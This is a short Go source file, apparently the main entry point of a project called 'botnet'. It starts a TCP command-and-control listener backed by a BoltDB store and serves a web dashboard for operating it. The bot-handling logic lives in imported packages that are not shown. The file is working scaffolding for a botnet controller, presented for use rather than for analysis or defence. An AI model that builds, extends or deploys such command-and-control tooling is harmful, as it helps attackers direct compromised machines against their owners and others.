package main

import (
	"flag"
	"log"

	"github.com/rodzzlessa24/botnet"

	"github.com/rodzzlessa24/botnet/tcp"

	"github.com/rodzzlessa24/botnet/bolt"
	"github.com/rodzzlessa24/botnet/http"
)

var (
	hostPtr    = flag.String("host", "127.0.0.1", "the host for the command and control")
	portPtr    = flag.String("port", "9090", "the port for the command and control")
	webPortPtr = flag.String("webport", "8000", "the port for the web dashboard")
)

func main() {
	flag.Parse()

	// Set the httpAddress
	httpAddress := ":8000"
	if *webPortPtr != "" {
		httpAddress = ":" + *webPortPtr
	}

	// Open boltdb database
	db, err := bolt.Open("./cc.db")
	if err != nil {
		log.Panic(err)
	}
	defer db.Close()

	// create a new storage service client
	storage, err := bolt.NewClient(db)
	if err != nil {
		log.Panic(err)
	}

	// create a tcp command control
	commander := tcp.NewCC(*hostPtr, *portPtr, storage)
	go commander.Listen()

	h := http.NewHandler(commander, storage)

	botnet.Msg("web server available on port", *webPortPtr)
	log.Fatal(http.ListenAndServe(httpAddress, h))
}
